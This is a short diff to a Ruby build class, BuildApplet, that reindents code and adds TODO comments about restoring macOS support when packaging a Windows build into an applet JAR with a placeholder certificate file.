@@ -18,7 +18,8 @@ class BuildApplet < Build
   def generate(params)
     trace :debug, "Build: generate: #{params}"
 
-		params['platforms'] = ['windows']
+    # TODO: remove when macos is supported again
+    params['platforms'] = ['windows']
     
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
@@ -64,6 +65,7 @@ class BuildApplet < Build
     File.rename path('output_windows'), path('win') if File.exist? path('output_windows')
 
     CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} win", {:chdir => path('')} if File.exist? path('win')
+    # TODO: remove when macos is supported again
     #CrossPlatform.exec path("zip"), "-u #{path(@appname + '.jar')} mac", {:chdir => path('')} if File.exist? path('mac')
 
     # prepare the html file
@@ -76,8 +78,8 @@ class BuildApplet < Build
 
   def sign(params)
   
-  	# this file is needed by the NI. create a fake one.
-  	File.open(path(@appname + '.cer'), 'wb') {|f| f.write 'placeholder'}
+    # this file is needed by the NI. create a fake one.
+    File.open(path(@appname + '.cer'), 'wb') {|f| f.write 'placeholder'}
     @outputs << @appname + '.cer'
     
     #
